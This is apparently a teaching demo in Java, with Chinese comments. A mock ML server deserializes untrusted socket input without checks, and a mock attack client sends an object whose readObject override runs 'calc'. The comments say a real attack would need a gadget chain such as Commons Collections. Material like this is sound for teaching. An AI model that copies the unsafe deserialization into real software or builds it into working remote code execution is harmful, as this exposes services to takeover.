import java.io.*;
import java.net.*;
import java.util.*;

// 模拟机器学习服务端接收序列化模型数据
public class MLModelServer {
    static class ModelData implements Serializable {
        String modelName;
        double[] weights;
        
        public ModelData(String name, double[] w) {
            modelName = name;
            weights = w;
        }
    }

    public static void main(String[] args) {
        try {
            ServerSocket ss = new ServerSocket(8080);
            System.out.println("[+] ML Server started on port 8080");
            
            while (true) {
                Socket client = ss.accept();
                handleClient(client);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void handleClient(Socket client) throws IOException {
        try (ObjectInputStream ois = new ObjectInputStream(client.getInputStream())) {
            // 不安全的反序列化操作
            Object obj = ois.readObject();
            
            if (obj instanceof ModelData) {
                ModelData data = (ModelData) obj;
                System.out.println("Received model: " + data.modelName);
                System.out.println("Weights length: " + data.weights.length);
                // 模拟模型训练过程
                double sum = 0;
                for (double w : data.weights) {
                    sum += w;
                }
                System.out.println("Average weight: " + (sum/data.weights.length));
            } else {
                System.out.println("Received unknown object type: " + obj.getClass());
            }
        } catch (Exception e) {
            System.out.println("[-] Error handling client: " + e.getMessage());
        }
    }

    // 模拟攻击者客户端发送恶意序列化数据
    static class AttackClient {
        public static void main(String[] args) throws Exception {
            String host = "localhost";
            int port = 8080;
            
            try (Socket socket = new Socket(host, port)) {
                ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                
                // 构造恶意序列化对象（示例：通过Apache Commons Collections实现RCE）
                // 注意：实际攻击需要依赖具体Gadget链，此处仅模拟结构
                Object payload = createEvilObject();
                oos.writeObject(payload);
                oos.flush();
            }
        }

        static Object createEvilObject() {
            // 实际攻击会构造复杂的Transformer链，此处仅模拟结构
            return new ModelData("malicious_model", new double[]{1.0, 2.0}) {
                // 重写readObject方法触发任意代码执行
                private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
                    in.defaultReadObject();
                    try {
                        // 模拟执行任意命令（如启动计算器）
                        Runtime.getRuntime().exec("calc");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
        }
    }
}